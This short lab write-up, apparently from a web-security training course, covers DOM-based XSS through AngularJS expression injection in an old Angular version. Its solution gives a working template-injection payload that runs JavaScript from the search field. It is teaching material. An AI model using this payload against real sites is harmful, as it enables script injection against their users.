# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
## Description

When an old and vulnerable version of Angular is used, it might be possible to trigger DOM based xss. Example: http://jsfiddle.net/2zs2yv7o/1/

## Solution

In the search field, enter: `{{constructor.constructor('alert(1)')()}}`